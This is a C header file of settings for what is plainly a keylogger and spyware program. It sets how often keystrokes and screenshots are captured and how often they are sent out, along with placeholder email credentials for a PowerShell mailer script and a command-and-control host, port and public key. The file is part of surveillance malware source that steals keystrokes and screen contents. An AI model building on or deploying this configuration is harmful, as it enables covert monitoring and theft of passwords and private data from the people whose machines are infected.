#pragma once

#ifndef SETTINGS_H
#define SETTINGS_H

/**
 * Whether or not to write debug logs
 **/
#define DEBUG true

/**
 * Name of powershell script used to send
 * mail
 **/
#define SCRIPT_NAME "sm.ps1"

/**
 * Name of the master log
 **/
#define MASTER_LOG_NAME "master_log.log"

/**
 * How often the keylog is written in minutes
 **/
#define LOG_FREQUENCY_MINUTES 1

/**
 * How often the keylog and screenshots are 
 * dumped to the server in minutes
 */
#define DUMP_FREQUENCY_MINUTES 60

/**
 * How often screenshots are recorded in minutes
 */
#define SS_FREQUENCY_MINUTES 5

/**
 * Login Credentials for email
 **/
#define X_EM_TO "TEST"
#define X_EM_FROM "TEST"
#define X_EM_PASS "TEST"

/**
 * Comand and Control ip and port
 **/
#define CC_HOSTNAME "localhost"
#define CC_PORT 3008

/**
 * Public key of cc server
 **/
#define CC_PUBLIC_KEY ""

#endif
